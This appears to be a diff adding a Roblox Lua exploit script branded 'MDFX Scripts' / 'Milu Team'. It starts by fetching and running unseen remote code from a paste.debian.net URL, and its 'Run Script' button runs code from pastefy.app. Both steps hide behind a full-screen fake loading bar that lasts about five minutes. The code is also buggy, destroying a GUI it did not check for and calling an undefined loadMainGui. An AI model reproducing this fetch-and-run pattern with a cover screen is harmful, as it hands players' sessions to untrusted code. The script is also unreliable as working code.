@@ -1,1 +1,381 @@
+-- run the first external script first
 loadstring(game:HttpGet("https://paste.debian.net/plainh/b82fbcdb/", true))()
+
+-- then run your ui script
+task.defer(function()
+    local TweenService = game:GetService("TweenService")
+    local CoreGui = game:GetService("CoreGui")
+
+    if CoreGui:FindFirstChild("UniversalScriptLoading") then
+        CoreGui:FindFirstChild("UniversalLoading"):Destroy()
+    end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "UniversalScript"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.Parent = CoreGui
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
+    bg.BorderSizePixel = 0
+    bg.ZIndex = 0
+    bg.Parent = gui
+
+    local gradient = Instance.new("UIGradient")
+    gradient.Rotation = 90
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0.0, Color3.fromRGB(10, 10, 30)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 20, 40)),
+        ColorSequenceKeypoint.new(1.0, Color3.fromRGB(5, 5, 15))
+    })
+    gradient.Parent = bg
+
+    local shimmer = Instance.new("Frame")
+    shimmer.Size = UDim2.new(2, 0, 2, 0)
+    shimmer.Position = UDim2.new(-0.5, 0, -0.5, 0)
+    shimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    shimmer.BackgroundTransparency = 0.98
+    shimmer.BorderSizePixel = 0
+    shimmer.ZIndex = 1
+    shimmer.Parent = bg
+
+    local shimmerGradient = Instance.new("UIGradient")
+    shimmerGradient.Rotation = 45
+    shimmerGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 100, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 180, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 100, 255))
+    }
+    shimmerGradient.Parent = shimmer
+
+    TweenService:Create(shimmer, TweenInfo.new(20, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+        Rotation = 180
+    }):Play()
+
+    local title = Instance.new("TextLabel")
+    title.Text = "MDFX Scripts"
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 40
+    title.TextColor3 = Color3.fromRGB(230, 230, 255)
+    title.TextTransparency = 1
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0.28, 0)
+    title.ZIndex = 3
+    title.Parent = bg
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Text = "Script Assets initializing..."
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextSize = 20
+    subtitle.TextColor3 = Color3.fromRGB(180, 190, 220)
+    subtitle.TextTransparency = 1
+    subtitle.BackgroundTransparency = 1
+    subtitle.Size = UDim2.new(1, 0, 0, 30)
+    subtitle.Position = UDim2.new(0, 0, 0.38, 0)
+    subtitle.ZIndex = 3
+    subtitle.Parent = bg
+
+    local barBG = Instance.new("Frame")
+    barBG.Size = UDim2.new(0.4, 0, 0, 20)
+    barBG.Position = UDim2.new(0.3, 0, 0.48, 0)
+    barBG.BackgroundColor3 = Color3.fromRGB(50, 60, 90)
+    barBG.BorderSizePixel = 0
+    barBG.ZIndex = 3
+    barBG.Parent = bg
+    Instance.new("UICorner", barBG)
+
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(100, 255, 200)
+    barFill.BorderSizePixel = 0
+    barFill.ZIndex = 4
+    barFill.Parent = barBG
+    Instance.new("UICorner", barFill)
+
+    local percent = Instance.new("TextLabel")
+    percent.Text = "0%"
+    percent.Font = Enum.Font.GothamBold
+    percent.TextSize = 20
+    percent.TextColor3 = Color3.fromRGB(230, 240, 255)
+    percent.BackgroundTransparency = 1
+    percent.Size = UDim2.new(1, 0, 0, 30)
+    percent.Position = UDim2.new(0, 0, 0.6, 25)
+    percent.ZIndex = 3
+    percent.Parent = bg
+
+    local function animateTextIn()
+        local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        TweenService:Create(title, tweenInfo, {TextTransparency = 0}):Play()
+        TweenService:Create(subtitle, tweenInfo, {TextTransparency = 0}):Play()
+    end
+
+    local function spawnDiagonalStar()
+        local star = Instance.new("Frame")
+        local size = math.random(2, 4)
+        star.Size = UDim2.new(0, size, 0, size)
+        star.Position = UDim2.new(math.random(), 0, -0.1, 0)
+        star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        star.BackgroundTransparency = 0.3
+        star.BorderSizePixel = 0
+        star.ZIndex = 2
+        star.Parent = bg
+
+        local endX = star.Position.X.Scale - 0.3 + math.random() * 0.2
+        local endY = star.Position.Y.Scale + 1.2
+
+        local tween = TweenService:Create(star, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {
+            Position = UDim2.new(endX, 0, endY, 0),
+            BackgroundTransparency = 1
+        })
+        tween:Play()
+
+        tween.Completed:Connect(function()
+            star:Destroy()
+        end)
+    end
+
+    task.spawn(function()
+        while true do
+            spawnDiagonalStar()
+            wait(0.03)
+        end
+    end)
+
+    local Players = game:GetService("Players")
+    local localPlayer = Players.LocalPlayer
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "CustomPanelUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+    local function addCorner(obj, radius)
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, radius)
+        corner.Parent = obj
+    end
+
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 20
+    blur.Enabled = false
+    blur.Parent = game:GetService("Lighting")
+
+    local openButton = Instance.new("TextButton")
+    openButton.Name = "OpenButton"
+    openButton.Text = "Open Panel"
+    openButton.Size = UDim2.new(0, 160, 0, 45)
+    openButton.Position = UDim2.new(1, -170, 1, -100)
+    openButton.AnchorPoint = Vector2.new(0, 1)
+    openButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    openButton.Font = Enum.Font.GothamBold
+    openButton.TextSize = 18
+    openButton.BackgroundTransparency = 0.2
+    openButton.BorderSizePixel = 0
+    addCorner(openButton, 12)
+    openButton.Parent = screenGui
+
+    openButton.MouseEnter:Connect(function()
+        openButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end)
+    openButton.MouseLeave:Connect(function()
+        openButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    end)
+
+    local panel = Instance.new("Frame")
+    panel.Name = "MainPanel"
+    panel.Size = UDim2.new(0, 450, 0, 300)
+    panel.Position = UDim2.new(0.5, -220, 0.5, -170)
+    panel.BackgroundColor3 = Color3.fromRGB(10, 25, 25)
+    panel.BackgroundTransparency = 0.1
+    panel.BorderSizePixel = 0
+    panel.Visible = false
+    addCorner(panel, 14)
+    panel.Parent = screenGui
+
+    local shadow = Instance.new("ImageLabel")
+    shadow.Size = UDim2.new(1, 12, 1, 12)
+    shadow.Position = UDim2.new(0, -6, 0, -6)
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://5761556465"
+    shadow.ImageTransparency = 0.4
+    shadow.ZIndex = 0
+    shadow.Parent = panel
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Text = "Milu Team"
+    titleLabel.Size = UDim2.new(1, 0, 0, 40)
+    titleLabel.BackgroundColor3 = Color3.fromRGB(0, 25, 25)
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextSize = 22
+    titleLabel.BorderSizePixel = 0
+    titleLabel.BackgroundTransparency = 0.1
+    titleLabel.TextStrokeTransparency = 0.6
+    addCorner(titleLabel, 8)
+    titleLabel.Parent = panel
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Text = "@Milu Scripts"
+    subtitle.Size = UDim2.new(1, 0, 0, 25)
+    subtitle.Position = UDim2.new(0, -170, 0, 15)
+    subtitle.BackgroundTransparency = 1
+    subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextSize = 16
+    subtitle.TextXAlignment = Enum.TextXAlignment.Center
+    subtitle.Parent = panel
+
+    local backButton = Instance.new("TextButton")
+    backButton.Text = "Go Back"
+    backButton.Size = UDim2.new(0, 120, 0, 36)
+    backButton.Position = UDim2.new(1, -130, 1, -50)
+    backButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    backButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    backButton.Font = Enum.Font.GothamBold
+    backButton.TextSize = 16
+    backButton.BorderSizePixel = 0
+    addCorner(backButton, 10)
+    backButton.Parent = panel
+
+    local runScriptButton = Instance.new("TextButton")
+    runScriptButton.Text = "Run Script"
+    runScriptButton.Size = UDim2.new(0, 120, 0, 36)
+    runScriptButton.Position = UDim2.new(0, 20,1,  -50)
+    runScriptButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+    runScriptButton.TextColor3 = Color3.new(1, 1, 1)
+    runScriptButton.Font = Enum.Font.GothamBold
+    runScriptButton.TextSize = 16
+    runScriptButton.BorderSizePixel = 0
+    addCorner(runScriptButton, 10)
+    runScriptButton.Parent = panel
+
+    backButton.MouseEnter:Connect(function()
+        backButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+    end)
+    backButton.MouseLeave:Connect(function()
+        backButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    end)
+
+    openButton.MouseButton1Click:Connect(function()
+        panel.Visible = true
+        blur.Enabled = true
+    end)
+
+    backButton.MouseButton1Click:Connect(function()
+        panel.Visible = false
+        blur.Enabled = false
+    end)
+
+    runScriptButton.MouseButton1Click:Connect(function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/kzE2omsN/raw"))()
+        end)
+        if not success then
+            warn("Failed to load external script:", err)
+        end
+    end)
+
+    local tabButtonFrame = Instance.new("Frame")
+    tabButtonFrame.Size = UDim2.new(1, -20, 0, 36)
+    tabButtonFrame.Position = UDim2.new(0, 10, 0, 40)
+    tabButtonFrame.BackgroundTransparency = 1
+    tabButtonFrame.Parent = panel
+
+    local tabLayout = Instance.new("UIListLayout")
+    tabLayout.FillDirection = Enum.FillDirection.Horizontal
+    tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+    tabLayout.Padding = UDim.new(0, 6)
+    tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    tabLayout.Parent = tabButtonFrame
+
+    local function createTabButton(name)
+        local btn = Instance.new("TextButton")
+        btn.Text = name
+        btn.Size = UDim2.new(0, 120, 0, 36)
+        btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 16
+        btn.BorderSizePixel = 0
+        addCorner(btn, 10)
+        btn.Parent = tabButtonFrame
+        return btn
+    end
+
+    local tabs = {
+        Home = createTabButton("Home"),
+        Settings = createTabButton("Settings"),
+        About = createTabButton("About")
+    }
+
+    local pages = {}
+    for tabName, _ in pairs(tabs) do
+        local page = Instance.new("Frame")
+        page.Name = tabName .. "Page"
+        page.Size = UDim2.new(1, -20, 1, -160)
+        page.Position = UDim2.new(0, 10, 0,  80)
+        page.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        page.Visible = false
+        addCorner(page, 10)
+        page.Parent = panel
+
+        local label = Instance.new("TextLabel")
+        label.Text = tabName .. " Page Content"
+        label.Size = UDim2.new(1, 0, 1, 30)
+        label.BackgroundTransparency = 1
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        label.Font = Enum.Font.Gotham
+        label.TextSize = 20
+        label.TextWrapped = true
+        label.TextYAlignment = Enum.TextYAlignment.Top
+        label.Parent = page
+
+        pages[tabName] = page
+    end
+
+    local function switchToTab(name)
+        for tab, button in pairs(tabs) do
+            if tab == name then
+                pages[tab].Visible = true
+                button.BackgroundColor3 = Color3.fromRGB(20, 40, 40)
+            else
+                pages[tab].Visible = false
+                button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+            end
+        end
+    end
+
+    for tabName, button in pairs(tabs) do
+        button.MouseButton1Click:Connect(function()
+            switchToTab(tabName)
+        end)
+    end
+
+    switchToTab("Home")
+
+    local function loadScript()
+        animateTextIn()
+        local duration = 300
+        local steps = 100
+        local stepTime = duration / steps
+
+        for i = 1, steps do
+            local goal = { Size = UDim2.new(i / 100, 0, 1, 0) }
+            local tweenInfo = TweenInfo.new(stepTime, Enum.EasingStyle.Linear)
+            TweenService:Create(barFill, tweenInfo, goal):Play()
+
+            percent.Text = i .. "%"
+            wait(stepTime)
+        end
+
+        wait(0.5)
+        gui:Destroy()
+        loadMainGui()
+    end
+
+    loadScript()
+end)
